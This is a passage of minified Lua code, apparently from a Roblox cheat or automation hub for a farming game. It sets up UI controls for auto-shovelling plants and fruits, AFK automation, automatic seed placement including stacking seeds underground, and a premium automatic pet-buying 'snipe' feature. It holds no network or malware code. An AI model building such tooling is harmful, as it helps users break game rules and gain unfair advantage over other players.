		y:AddDivider()
		local j
		local i = "\226\172\135\239\184\143 <font color=\'#7CFC00\'>Minimum</font> Height"
		j = y:AddInput("shovel_plant_min_height_ui", {
			Text = i,
			Default = tostring(h.shovel_plant_min_height),
			Numeric = true;
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Minimum Height",
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Minimum height must be 0 or more", 3)
					j:SetValue(tostring(h.shovel_plant_min_height))
					return
				end
				local y = tonumber(h.shovel_plant_max_height) or 200
				if V > y then
					g.Notify("Minimum height must be lower than maximum", 3)
					j:SetValue(tostring(h.shovel_plant_min_height))
					return
				end
				h.shovel_plant_min_height = V
				a.Save.SaveDataSync()
				j:SetText("\226\156\133 <font color=\'#00FF00\'>Minimum Height Updated</font>")
				task.delay(1.5, function()
					if j then
						j:SetText(i)
					end
				end)
			end
		})
		local c
		local J = "\226\172\134\239\184\143 <font color=\'#FF6B6B\'>Maximum</font> Height"
		c = y:AddInput("shovel_plant_max_height_ui", {
			Text = J;
			Default = tostring(h.shovel_plant_max_height);
			Numeric = true;
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Maximum Height";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Maximum height must be 0 or more", 3)
					c:SetValue(tostring(h.shovel_plant_max_height))
					return
				end
				local y = tonumber(h.shovel_plant_min_height) or 0
				if V < y then
					g.Notify("Maximum height must be higher than minimum", 3)
					c:SetValue(tostring(h.shovel_plant_max_height))
					return
				end
				h.shovel_plant_max_height = V
				a.Save.SaveDataSync()
				c:SetText("\226\156\133 <font color=\'#00FF00\'>Maximum Height Updated</font>")
				task.delay(1.5, function()
					if c then
						c:SetText(J)
					end
				end)
			end
		})
		y:AddDivider()
		local d
		d = y:AddValueDropdown("shovel_plant_variants_ui", {
			Values = {};
			Default = {};
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\226\156\168 Variant",
			Tooltip = "No selection means all variants, including plants without a mutation.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.shovel_plant_variants = G
				a.Save.SaveDataSync()
			end
		})
		d:SetValues(Z.Mutations.GetNames())
		d:SetValue(h.shovel_plant_variants)
		local u
		u = y:AddValueDropdown("shovel_plant_variant_blacklist_ui", {
			Values = Z.Mutations.GetNames(),
			Default = {};
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\155\161\239\184\143 Protect Plant Variants";
			Tooltip = "Plants containing selected variants will never be shoveled.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.shovel_plant_variant_blacklist = G
				a.Save.SaveDataSync()
			end
		})
		u:SetValue(h.shovel_plant_variant_blacklist)
		y:AddToggle("shovel_growing_plants_ui", {
			Text = "<font color=\'#FFAA55\'>\240\159\140\177 Shovel Growing Plants</font>",
			Default = h.shovel_growing_plants;
			Tooltip = "Also removes plants where Age is lower than MaxAge.";
			Callback = function(G)
				h.shovel_growing_plants = G
				a.Save.SaveDataSync()
			end
		})
		y:AddDivider()
		local q
		local E = "\240\159\155\161\239\184\143 Max <font color=\'#7CFC00\'>Plants To Keep</font>"
		q = y:AddInput("shovel_plants_keep_ui", {
			Text = E,
			Default = tostring(h.shovel_plants_keep);
			Numeric = true,
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "Plants to keep per type",
			Tooltip = "Enter 0 to remove all eligible plants. The keep amount applies separately to each selected plant type.";
			Callback = function(G)
				local V = z(G)
				if not V or V < 0 then
					g.Notify("Keep amount must be a whole number of 0 or more", 3)
					q:SetValue(tostring(h.shovel_plants_keep))
					return
				end
				h.shovel_plants_keep = V
				a.Save.SaveDataSync()
				q:SetText("\226\156\133 <font color=\'#00FF00\'>Keep Amount Updated</font>")
				task.delay(1.5, function()
					if q then
						q:SetText(E)
					end
				end)
			end
		})
		y:AddDivider()
		local H
		H = y:AddToggle("enable_plant_shovel_ui", {
			Text = "<font color=\'#FF3333\'><b>\226\154\160\239\184\143 Enable Plant Shovel</b></font>",
			Default = h.auto_shovel_plants,
			Tooltip = "Permanently removes entire plants matching the selected filters.";
			Callback = function(G)
				if G == h.auto_shovel_plants then
					return
				end
				if G and not h.auto_shovel_plants then
					T:Confirm({
						Title = "\226\154\160\239\184\143 Enable Plant Shovel?";
						Description = "This will permanently remove entire plants and every fruit attached to them.\n\nThis cannot be undone.\n\nCheck your selected plant types, height range, variants, growing option and keep amount before continuing.";
						Callback = function(G)
							if G then
								h.auto_shovel_plants = true
								Z.PlantShovel.SetStatus("Starting...", "#FF7777")
								a.Save.SaveDataSync()
							else
								H:SetValue(h.auto_shovel_plants)
							end
						end
					})
					return
				end
				h.auto_shovel_plants = false
				Z.PlantShovel.ClearStatus()
				a.Save.SaveDataSync()
			end
		})
	end
	if V then
		V:AddLabel({
			Text = "\226\154\160\239\184\143 Matching fruits are permanently removed. Single-harvest plants are excluded.";
			DoesWrap = true
		})
		local G
		G = V:AddValueDropdown("shovel_fruit_types", {
			Values = {},
			Default = {},
			Multi = true;
			Text = "\240\159\141\142 Fruit Type",
			Tooltip = "Only selected fruit types will be removed.";
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.shovel_fruit_types = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.ShovelFruits.GetFruitTypeDropdown())
		G:SetValue(h.shovel_fruit_types)
		local y = V:AddButton({
			Text = "\226\156\133 <font color=\'#7CFF8A\'><b>All</b></font>",
			Func = function()
				local V = Z.ShovelFruits.GetAllFruitTypeSelection()
				h.shovel_fruit_types = V
				G:SetValue(V)
				a.Save.SaveDataSync()
			end
		})
		y:AddButton({
			Text = "\240\159\167\185 <font color=\'#FFB86B\'><b>Clear</b></font>",
			Func = function()
				h.shovel_fruit_types = {}
				G:SetValue({})
				a.Save.SaveDataSync()
			end
		})
		V:AddDivider()
		local j
		j = V:AddValueDropdown("shovel_mutation_whitelist", {
			Values = Z.ShovelFruits.GetMutationNames();
			Default = {};
			Multi = true,
			Text = "\226\156\133 Whitelist Mutations",
			Tooltip = "When used, only fruits containing at least one selected mutation will be removed.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.shovel_mutation_whitelist = G
				a.Save.SaveDataSync()
			end
		})
		j:SetValue(h.shovel_mutation_whitelist)
		local i
		i = V:AddValueDropdown("shovel_mutation_blacklist", {
			Values = Z.ShovelFruits.GetMutationNames();
			Default = {};
			Multi = true,
			Text = "\226\155\148 Blacklist Mutations";
			Tooltip = "Fruits containing any selected mutation will never be removed. Blacklist wins.",
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.shovel_mutation_blacklist = G
				a.Save.SaveDataSync()
			end
		})
		i:SetValue(h.shovel_mutation_blacklist)
		V:AddDivider()
		local c
		local J = "\226\172\135\239\184\143 <font color=\'#7CFC00\'>Minimum</font> Weight [KG]"
		c = V:AddInput("shovel_min_weight", {
			Text = J;
			Default = tostring(h.shovel_min_weight),
			Numeric = true;
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Minimum Weight";
			Callback = function(G)
				local V = f(G)
				if not V then
					g.Notify("Invalid number: " .. tostring(G), 3)
					c:SetValue(tostring(h.shovel_min_weight))
					return
				end
				if V < 0 then
					g.Notify("Enter a value of 0 or more", 3)
					c:SetValue(tostring(h.shovel_min_weight))
					return
				end
				local y = tonumber(h.shovel_max_weight) or 1000000000
				if V > y then
					g.Notify("Minimum must be lower than maximum", 3)
					c:SetValue(tostring(h.shovel_min_weight))
					return
				end
				h.shovel_min_weight = V
				a.Save.SaveDataSync()
				c:SetText("\226\156\133 <font color=\'#00FF00\'>Minimum Weight Updated</font>")
				task.delay(1.5, function()
					if c then
						c:SetText(J)
					end
				end)
			end
		})
		local T
		local d = "\226\172\134\239\184\143 <font color=\'#FF6B6B\'>Maximum</font> Weight [KG]"
		T = V:AddInput("shovel_max_weight", {
			Text = d;
			Default = tostring(h.shovel_max_weight),
			Numeric = true;
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "Maximum Weight",
			Callback = function(G)
				local V = f(G)
				if not V then
					g.Notify("Invalid number: " .. tostring(G), 3)
					T:SetValue(tostring(h.shovel_max_weight))
					return
				end
				if V <= 0 then
					g.Notify("Enter a value greater than 0", 3)
					T:SetValue(tostring(h.shovel_max_weight))
					return
				end
				local y = tonumber(h.shovel_min_weight) or 0
				if V < y then
					g.Notify("Maximum must be higher than minimum", 3)
					T:SetValue(tostring(h.shovel_max_weight))
					return
				end
				h.shovel_max_weight = V
				a.Save.SaveDataSync()
				T:SetText("\226\156\133 <font color=\'#00FF00\'>Maximum Weight Updated</font>")
				task.delay(1.5, function()
					if T then
						T:SetText(d)
					end
				end)
			end
		})
		V:AddDivider()
		local u
		u = V:AddValueDropdown("shovel_variants", {
			Values = Z.ShovelFruits.GetVariantNames();
			Default = {},
			Multi = true,
			Text = "\226\156\168 Variant",
			Tooltip = "Normal, Gold or Rainbow. No selection removes nothing.";
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.shovel_variants = G
				a.Save.SaveDataSync()
			end
		})
		u:SetValue(h.shovel_variants)
		V:AddDivider()
		V:AddToggle("enable_shovel_fruits", {
			Text = "<font color=\'#FF6B6B\'>Enable Shovel</font>",
			Default = h.auto_shovel_fruits,
			Tooltip = "Permanently removes fruits matching all configured filters.";
			Callback = function(G)
				h.auto_shovel_fruits = G == true
				if not G then
					Z.ShovelFruits.CleanupTool()
				end
				a.Save.SaveData()
			end
		})
	end
end
g.AutomationUi = function()
	local G = d:AddTab({
		Name = "Automation";
		Description = "Smart automation",
		Icon = "bot"
	})
	local V = G:AddLeftGroupbox("Total Control", "bot")
	local y = G:AddLeftGroupbox("Smart Seeding", "sparkles")
	if V then
		V:AddLabel({
			Text = "Runs the AFK controller and keeps the main toggle enabled after rejoin.",
			DoesWrap = true
		})
		V:AddToggle("total_control_session_enabled_ui", {
			Text = "\240\159\167\160 Total Control";
			Default = h.total_control_enabled == true,
			Tooltip = "Keeps Total Control enabled after rejoin. Internal strategy state is still session-only.",
			Callback = function(G)
				Z.TotalControl.SetEnabledTotalControl(G == true)
			end
		})
	end
	if y then
		y:AddLabel({
			Text = "Plants your best owned seeds first, then replaces weak plants only when a better seed is ready.";
			DoesWrap = true
		})
		g.SmartSeedProgressionUiRefs.StatusLabel = y:AddLabel({
			Text = Z.SmartSeedProgression.GetUiTextSmartSeedProgression(),
			DoesWrap = true
		})
		y:AddButton({
			Text = "\226\150\182\239\184\143 Start Smart Seeding";
			Tooltip = "Checks required settings once, then starts smart seeding.";
			Func = function()
				Z.SmartSeedProgression.StartSmartSeedProgression(true)
			end
		})
		y:AddButton({
			Text = "\226\143\185\239\184\143 Stop Smart Seeding";
			Tooltip = "Stops smart seeding.";
			Func = function()
				Z.SmartSeedProgression.StopSmartSeedProgression()
			end
		})
		y:AddDivider()
		y:AddToggle("smart_seed_progression_mutation_seeds_enabled_ui", {
			Text = "\240\159\167\172 Use Mutation Seeds",
			Default = h.smart_seed_progression_mutation_seeds_enabled,
			Tooltip = "Allows smart seeding to use special mutation seeds before normal seeds.";
			Callback = function(G)
				h.smart_seed_progression_mutation_seeds_enabled = G == true
				a.Save.SaveDataSync()
			end
		})
		local G
		G = y:AddValueDropdown("smart_seed_progression_prevent_placement_ui", {
			Values = Z.SmartSeedProgression.GetPlantValuesSmartSeedProgression();
			Default = {},
			Multi = true,
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\154\171 Prevent Seed Placement",
			Tooltip = "Selected seeds will never be planted by smart seeding.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.smart_seed_progression_prevent_placement_seeds = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(h.smart_seed_progression_prevent_placement_seeds)
		local V
		V = y:AddValueDropdown("smart_seed_progression_prevent_plants_ui", {
			Values = Z.SmartSeedProgression.GetPlantValuesSmartSeedProgression(),
			Default = {};
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\155\161\239\184\143 Prevent Shovel Plants";
			Tooltip = "Selected plants will never be replaced by smart seeding.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.smart_seed_progression_prevent_shovel_plants = G
				a.Save.SaveDataSync()
			end
		})
		V:SetValue(h.smart_seed_progression_prevent_shovel_plants)
		local j
		j = y:AddValueDropdown("smart_seed_progression_prevent_rarity_ui", {
			Values = Z.SmartSeedProgression.GetRarityValuesSmartSeedProgression();
			Default = {};
			Multi = true;
			Searchable = false,
			MaxVisibleDropdownItems = 8;
			Text = "\240\159\146\142 Prevent Shovel Rarity";
			Tooltip = "Plants with selected rarities will never be replaced.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.smart_seed_progression_prevent_shovel_rarity = G
				a.Save.SaveDataSync()
			end
		})
		j:SetValue(h.smart_seed_progression_prevent_shovel_rarity)
		y:AddDivider()
		y:AddToggle("smart_seed_progression_debug_ui", {
			Text = "\240\159\144\158 Debug";
			Default = false,
			Tooltip = "Shows extra smart seeding details until you rejoin.",
			Callback = function(G)
				g.SmartSeedProgressionDebug = G == true
				Z.SmartSeedProgression.RefreshUiSmartSeedProgression()
			end
		})
		g.SmartSeedProgressionUiRefs.DebugLabel = y:AddLabel({
			Text = Z.SmartSeedProgression.GetDebugUiTextSmartSeedProgression();
			DoesWrap = true
		})
	end
end
g.AutoUi = function()
	local G = d:AddTab({
		Name = "Seed Placer";
		Description = "Places selected seeds";
		Icon = "sprout"
	})
	local V = G:AddLeftGroupbox("Seed Placement", "sprout")
	local y = G:AddRightGroupbox("Seed Target Overrides", "list-plus")
	if y then
		local G = ""
		local V = math.max(math.floor(tonumber(h.seed_place_default_target) or 10), 1)
		local j = false
		local i = {}
		local c = 0
		local J
		local T
		y:AddLabel({
			Text = "\240\159\146\161 Set a different planting target for individual seeds.",
			DoesWrap = true
		})
		local function d()
			for G, V in ipairs(i) do
				if V.Holder and typeof(V.Holder) == "Instance" then
					V.Holder:Destroy()
				end
			end
			table.clear(i)
			if y.Resize then
				y:Resize()
			end
		end
		local function u()
			local V = Z.Seeder.GetOverrideTarget(G)
			if V ~= nil then
				return V
			end
			return math.max(math.floor(tonumber(h.seed_place_default_target) or 10), 1)
		end
		local function q()
			if G == "" then
				return
			end
			V = u()
			j = true
			if J then
				J:SetValue(tostring(V))
				J:SetText(string.format("\240\159\142\175 Target Amount: <font color=\'#7CFC00\'>%d</font>", V))
			end
			if T then
				T:SetValue(Z.Seeder.GetOverrideTarget(G) ~= nil)
			end
			j = false
		end
		local E
		E = function()
			d()
			c += 1
			local V = {}
			if type(h.seed_place_overrides) == "table" then
				for G in pairs(h.seed_place_overrides) do
					if Z.Seeder.GetOverrideTarget(G) ~= nil then
						table.insert(V, G)
					end
				end
			end
			table.sort(V)
			if # V == 0 then
				local G = y:AddLabel({
					Text = "<font color=\'#888888\'>No active seed overrides</font>",
					DoesWrap = true
				})
				table.insert(i, G)
			else
				for V, j in ipairs(V) do
					local J = Z.Seeder.GetOverrideTarget(j)
					local T
					T = y:AddToggle(string.format("seed_active_override_%d_%d", c, V), {
						Text = string.format("\240\159\140\177 %s <font color=\'#7CFC00\'>Target: %d</font>", j, J);
						Default = true,
						Tooltip = "Disable this seed override.";
						Callback = function(V)
							if V then
								return
							end
							Z.Seeder.RemoveOverrideTarget(j)
							a.Save.SaveDataSync()
							if G == j then
								q()
							end
							task.defer(E)
						end
					})
					table.insert(i, T)
				end
			end
			if y.Resize then
				y:Resize()
			end
		end
		local H
		H = y:AddValueDropdown("seed_placer_override_seed", {
			Values = {},
			Default = "";
			Multi = false,
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\140\177 Select Seed";
			Tooltip = "Select a seed to configure its target.",
			Changed = function(V)
				if type(V) ~= "string" or V == "" then
					return
				end
				G = V
				q()
			end
		})
		H:SetValues(Z.SeedData.GetSeedDataListDropDown())
		J = y:AddInput("seed_placer_override_target", {
			Text = "\240\159\142\175 Target Amount";
			Default = tostring(V);
			Numeric = true,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Enter target amount",
			Tooltip = "Sets how many of this seed should remain planted.",
			Callback = function(y)
				if j then
					return
				end
				if G == "" then
					g.Notify("Select a seed first", 3)
					return
				end
				local i = z(y)
				if not i or i <= 0 then
					g.Notify("Target must be above 0", 3)
					q()
					return
				end
				V = i
				J:SetText(string.format("\240\159\142\175 Target Amount: <font color=\'#7CFC00\'>%d</font>", V))
				if Z.Seeder.GetOverrideTarget(G) ~= nil then
					Z.Seeder.SetOverrideTarget(G, V)
					a.Save.SaveDataSync()
					E()
				end
			end
		})
		T = y:AddToggle("seed_placer_enable_selected_override", {
			Text = "\240\159\146\165 Enable Override",
			Default = false;
			Tooltip = "Use the custom target for the selected seed.";
			Callback = function(y)
				if j then
					return
				end
				if G == "" then
					j = true
					T:SetValue(false)
					j = false
					g.Notify("Select a seed first", 3)
					return
				end
				if y then
					if not Z.Seeder.SetOverrideTarget(G, V) then
						j = true
						T:SetValue(false)
						j = false
						g.Notify("Failed to enable override", 3)
						return
					end
				else
					Z.Seeder.RemoveOverrideTarget(G)
				end
				a.Save.SaveDataSync()
				q()
				E()
			end
		})
		y:AddDivider()
		y:AddLabel({
			Text = "= <font color=\'#7CFC00\'>Active Seed Overrides</font> =",
			DoesWrap = true
		})
		E()
	end
	if V then
		local G
		G = V:AddValueDropdown("seed_placer_selected_seeds", {
			Values = {},
			Default = {};
			Multi = true;
			Text = "\240\159\140\177 Seeds to Plant";
			Tooltip = "Only selected seeds will be planted.";
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.allowed_seedsplace = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.SeedData.GetSeedDataListDropDown())
		G:SetValue(h.allowed_seedsplace)
		local y = V:AddButton({
			Text = "\226\156\133 All",
			Tooltip = "Selects every seed.";
			Func = function()
				h.allowed_seedsplace = Z.Seeder.GetAllSeedSelection()
				G:SetValue(h.allowed_seedsplace)
				a.Save.SaveDataSync()
			end
		})
		y:AddButton({
			Text = "\240\159\167\185 Clear",
			Tooltip = "Clears the selected seeds.";
			Func = function()
				h.allowed_seedsplace = {}
				G:SetValue({})
				a.Save.SaveDataSync()
			end
		})
		V:AddDivider()
		local j
		local i = "\240\159\142\175 Target Plants"
		j = V:AddInput("seed_placer_default_target", {
			Text = i;
			Default = tostring(h.seed_place_default_target);
			Numeric = true;
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Plants per selected seed";
			Tooltip = "Plants each selected seed until this amount is on your farm.";
			Callback = function(G)
				local V = z(G)
				if not V or V <= 0 then
					g.Notify("Target must be a whole number above 0", 3)
					j:SetValue(tostring(h.seed_place_default_target))
					return
				end
				h.seed_place_default_target = V
				a.Save.SaveDataSync()
				j:SetText("\226\156\133 <font color=\'#00FF00\'>Target Updated</font>")
				task.delay(1.5, function()
					if j then
						j:SetText(i)
					end
				end)
			end
		})
		local c
		local J = "\240\159\140\179 Maximum Garden Plants"
		c = V:AddInput("seed_placer_max_garden_plants", {
			Text = J;
			Default = tostring(h.seed_place_max_garden_plants);
			Numeric = true,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Maximum plants in garden";
			Tooltip = "Stops placing seeds when the garden reaches this amount.",
			Callback = function(G)
				local V = z(G)
				if not V or V < 0 then
					g.Notify("Maximum plants must be 0 or above", 3)
					c:SetValue(tostring(h.seed_place_max_garden_plants))
					return
				end
				h.seed_place_max_garden_plants = V
				a.Save.SaveDataSync()
				c:SetText("\226\156\133 <font color=\'#00FF00\'>Garden Limit Updated</font>")
				task.delay(1.5, function()
					if c then
						c:SetText(J)
					end
				end)
			end
		})
		local T
		local d = "\226\154\161 Delay Between Placements"
		T = V:AddInput("seed_placer_delay", {
			Text = d;
			Default = tostring(h.seed_place_delay);
			Numeric = true;
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Example: 0.3";
			Tooltip = "Lower values place seeds faster. Minimum 0.05 seconds.";
			Callback = function(G)
				local V = f(G)
				if not V or V < .001 then
					g.Notify("Delay must be 0.001 seconds or more", 3)
					T:SetValue(tostring(h.seed_place_delay))
					return
				end
				h.seed_place_delay = V
				a.Save.SaveDataSync()
				T:SetText("\226\156\133 <font color=\'#00FF00\'>Delay Updated</font>")
				task.delay(1.5, function()
					if T then
						T:SetText(d)
					end
				end)
			end
		})
		V:AddDivider()
		local u
		u = V:AddDropdown("seed_placer_mode", {
			Values = Z.Farm.GetPlacementModeOptionsFarm(true, {
				"Random"
			}, {
				"Saved Position"
			}),
			Default = h.seed_place_mode;
			Multi = false;
			Text = "\240\159\147\141 Placement Mode",
			Tooltip = "Choose where selected seeds will be planted.",
			Callback = function(G)
				if type(G) ~= "string" or G == "" then
					return
				end
				h.seed_place_mode = G
				a.Save.SaveDataSync()
			end
		})
		u:SetValue(h.seed_place_mode)
		local q = V:AddLabel({
			Text = Z.Seeder.GetSavedPositionText();
			DoesWrap = true
		})
		V:AddButton({
			Text = "\240\159\147\140 Save Current Position",
			Tooltip = "Stand inside your farm where seeds should be planted.",
			Func = function()
				local G, V = Z.Seeder.SaveCurrentPosition()
				g.Notify(V, 3)
				if G then
					h.seed_place_mode = "Saved Position"
					u:SetValue("Saved Position")
					if q then
						q:SetText(Z.Seeder.GetSavedPositionText())
					end
					a.Save.SaveDataSync()
				end
			end
		})
		V:AddDivider()
		V:AddToggle("seed_placer_wall_mode", {
			Text = "\240\159\167\177 Wall Mode",
			Default = h.seed_place_wall_mode;
			Tooltip = "Random mode starts around the outside of both plant areas and fills inward.";
			Callback = function(G)
				h.seed_place_wall_mode = G
				a.Save.SaveDataSync()
			end
		})
		V:AddDivider()
		V:AddToggle("seed_placer_stack_mode", {
			Text = "\240\159\167\188 Layers Stack Mode";
			Default = h.seed_place_stack_mode,
			Tooltip = "Saved or fixed farm positions place plants in closely stacked layers.";
			Callback = function(G)
				h.seed_place_stack_mode = G
				Z.Seeder.StackIndex = 0
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("seed_placer_stack_modeunderground", {
			Text = "\240\159\145\189 Stack Underground",
			Default = h.seed_place_stack_mode_underground,
			Tooltip = "Saved or fixed farm positions can stack underground.";
			Callback = function(G)
				h.seed_place_stack_mode_underground = G
				Z.Seeder.StackIndex = 0
				a.Save.SaveDataSync()
			end
		})
		V:AddDivider()
		V:AddToggle("enable_seed_placer", {
			Text = "\240\159\140\177 Enable Seed Placer",
			Default = h.auto_seedplace;
			Tooltip = "Continuously plants selected seeds up to their target amount.";
			Callback = function(G)
				h.auto_seedplace = G
				if not G then
					Z.Seeder.ClearStatus()
				end
				a.Save.SaveDataSync()
			end
		})
	end
end
g.PetUi = function()
	local G = d:AddTab({
		Name = "Pet Snipe " .. g.GetProLabel(),
		Description = "Buy pets on the farm.";
		Icon = "store"
	})
	local V = G:AddLeftGroupbox("Pet Finder Premium", "paw-print")
	local y = G:AddRightGroupbox("Pet Farm Return", "map-pinned")
	local j = G:AddRightGroupbox("Pet Buy List", "list-plus")
	local i = G:AddLeftGroupbox("Last Purchases", "history")
	if j then
		local G = ""
		local V = 1
		local y = {}
		local i = {}
		local c = false
		local J = {}
		local T = 0
		local d
		local u
		local q
		local E
		local H
		if not g.GetCheckIfPro() then
			j:AddLabel({
				Text = g.GetProMessage(),
				DoesWrap = true
			})
		end
		j:AddLabel({
			Text = "\240\159\146\161 Empty size or variant selection means any.";
			DoesWrap = true
		})
		local function r()
			for G, V in ipairs(J) do
				if V.Holder and typeof(V.Holder) == "Instance" then
					V.Holder:Destroy()
				end
			end
			table.clear(J)
			if j.Resize then
				j:Resize()
			end
		end
		local function Y(G)
			if type(G) ~= "table" or next(G) == nil then
				return "Any"
			end
			local V = {}
			for G, y in pairs(G) do
				if y == true then
					table.insert(V, G)
				end
			end
			table.sort(V)
			return # V > 0 and table.concat(V, ", ") or "Any"
		end
		local function e()
			if c or G == "" or not Z.PetFinderPremium.HasRule(G) then
				return
			end
			local j = Z.PetFinderPremium.GetRule(G)
			Z.PetFinderPremium.SetRule(G, V, y, i, j and j.enabled)
			a.Save.SaveDataSync()
		end
		local function s()
			if G == "" then
				return
			end
			local j = Z.PetFinderPremium.GetRule(G)
			V = j and j.target or 1
			y = j and j.sizes or {}
			i = j and j.variants or {}
			c = true
			u:SetValues(Z.PetFinderPremium.GetSizeValues())
			u:SetValue(y)
			q:SetValues(Z.PetFinderPremium.GetVariantValues())
			q:SetValue(i)
			E:SetValue(tostring(V))
			E:SetText(string.format("\240\159\142\175 Target Amount: <font color=\'#7CFC00\'>%d</font>", V))
			H:SetValue(j and j.enabled or false)
			c = false
		end
		local N
		N = function()
			r()
			T += 1
			local V = Z.PetFinderPremium.GetActiveRuleNames()
			if # V == 0 then
				local G = j:AddLabel({
					Text = "<font color=\'#888888\'>No active pet buy rules</font>",
					DoesWrap = true
				})
				table.insert(J, G)
			else
				for V, y in ipairs(V) do
					local i = Z.PetFinderPremium.GetRule(y)
					local c = i and Z.PetFinderPremium.CountOwnedForRule(y, i) or 0
					local d
					d = j:AddToggle(string.format("pet_finder_active_rule_%d_%d", T, V), {
						Text = string.format("\240\159\144\190 %s <font color=\'#7CFC00\'>%d/%d</font>\n<font color=\'#CFCFCF\'>Sizes: %s | Variants: %s</font>", Z.PetFinderPremium.GetDisplayName(y), c, i.target, Y(i.sizes), Y(i.variants));
						Default = true;
						Tooltip = "Disable this pet buy rule.";
						Callback = function(V)
							if V then
								return
							end
							Z.PetFinderPremium.SetRuleEnabled(y, false)
							a.Save.SaveDataSync()
							if G == y then
								s()
							end
							task.defer(N)
						end
					})
					table.insert(J, d)
				end
			end
			if j.Resize then
				j:Resize()
			end
		end
		d = j:AddValueDropdown("pet_finder_premium_pet_ui", {
			Values = {};
			Default = "";
			Multi = false;
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\144\190 Select Pet",
			Tooltip = "Select a pet to add or edit.",
			Changed = function(V)
				if type(V) ~= "string" or V == "" then
					return
				end
				G = V
				s()
			end
		})
		d:SetValues(Z.PetFinderPremium.GetPetDropdown())
		u = j:AddValueDropdown("pet_finder_premium_sizes_ui", {
			Values = {},
			Default = {},
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\147\143 Pet Sizes",
			Tooltip = "Leave empty to buy any size.";
			Changed = function(G)
				if c or type(G) ~= "table" then
					return
				end
				y = G
				e()
				N()
			end
		})
		u:SetValues(Z.PetFinderPremium.GetSizeValues())
		q = j:AddValueDropdown("pet_finder_premium_variants_ui", {
			Values = {};
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\140\136 Pet Variants",
			Tooltip = "Leave empty to buy Normal or Rainbow pets.";
			Changed = function(G)
				if c or type(G) ~= "table" then
					return
				end
				i = G
				e()
				N()
			end
		})
		q:SetValues(Z.PetFinderPremium.GetVariantValues())
		E = j:AddInput("pet_finder_premium_target_ui", {
			Text = "\240\159\142\175 Target Amount",
			Default = "999",
			Numeric = true;
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Owned target amount";
			Tooltip = "Stops buying this pet when the matching inventory amount is reached.";
			Callback = function(y)
				if c then
					return
				end
				if G == "" then
					g.Notify("Select a pet first", 3)
					return
				end
				local Z = z(y)
				if not Z or Z <= 0 then
					g.Notify("Target must be above 0", 3)
					s()
					return
				end
				V = Z
				E:SetText(string.format("\240\159\142\175 Target Amount: <font color=\'#7CFC00\'>%d</font>", V))
				e()
				N()
			end
		})
		H = j:AddToggle("pet_finder_premium_rule_enabled_ui", {
			Text = "\226\158\149 Enable Buy Rule",
			Default = false,
			Tooltip = "Adds the selected pet settings to the active buy list.";
			Callback = function(j)
				if c then
					return
				end
				if G == "" then
					c = true
					H:SetValue(false)
					c = false
					g.Notify("Select a pet first", 3)
					return
				end
				if j then
					if not Z.PetFinderPremium.SetRule(G, V, y, i, true) then
						c = true
						H:SetValue(false)
						c = false
						g.Notify("Failed to enable pet rule", 3)
						return
					end
				else
					Z.PetFinderPremium.SetRuleEnabled(G, false)
				end
				a.Save.SaveDataSync()
				s()
				N()
			end
		})
		j:AddDivider()
		j:AddLabel({
			Text = "= <font color=\'#7CFC00\'>Active Pet Buy List</font> =";
			DoesWrap = true
		})
		g.PetFinderPremiumUi.RefreshRules = N
		g.PetFinderPremiumUi.RefreshValues = function()
			c = true
			u:SetValues(Z.PetFinderPremium.GetSizeValues())
			q:SetValues(Z.PetFinderPremium.GetVariantValues())
			u:SetValue(y)
			q:SetValue(i)
			c = false
		end
		N()
	end
	if i then
		local G = {}
		local function V()
			for G, V in ipairs(G) do
				if V.Holder and typeof(V.Holder) == "Instance" then
					V.Holder:Destroy()
				end
			end
			table.clear(G)
			if i.Resize then
				i:Resize()
			end
		end
		local function y()
			V()
			local y = Z.TotalControl.IsEnabledTotalControl() and (type(X.cache.pet_purchase_log) == "table" and X.cache.pet_purchase_log) or type(h.pet_finder_purchase_log) == "table" and h.pet_finder_purchase_log or {}
			if # y == 0 then
				local V = i:AddLabel({
